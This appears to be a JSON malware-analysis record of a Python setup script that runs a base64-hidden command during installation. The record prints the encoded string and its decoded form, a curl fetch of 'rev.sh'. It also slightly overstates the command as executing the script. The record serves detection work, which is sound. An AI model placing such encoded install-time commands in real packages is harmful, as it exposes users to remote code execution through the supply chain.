{
  "purpose": "Define a setup script for a Python package that, upon installation or development setup, executes a hidden payload that makes an HTTP request to a specified URL.",
  "sources": "Base64-encoded string in b64d function used in notmalfunc, which is called during package installation.",
  "sinks": "os.system call executing decoded base64 command that makes a network request.",
  "flows": "During package installation or development, the code decodes the base64 string to a URL and executes it via os.system, causing the system to make an HTTP request.",
  "anomalies": "Use of base64 encoding to hide the URL being fetched, executing code via os.system during install, which is suspicious behavior. The URL suggests it might be a remote host potentially used for malicious purposes.",
  "analysis": "The code imports standard setup tools modules and defines a function to decode base64-encoded strings. It encodes a URL in base64 ('Y3VybCBodHRwOi8vbG9jYWxob3N0L3Jldi5zaAo=') which decodes to 'curl http://localhost/rev.sh'. During the install process, the script runs this command via os.system, causing the system to attempt to execute a remote shell script hosted locally. The use of base64 encoding and execution during setup is suspicious, indicating potential malicious behavior, such as downloading and executing remote code during package installation.",
  "conclusion": "This code contains malicious behavior intended to execute a network request to a specified URL during package installation, which could lead to remote code execution or system compromise. The use of encoded commands and execution during setup is suspicious and indicates potential malware intent.",
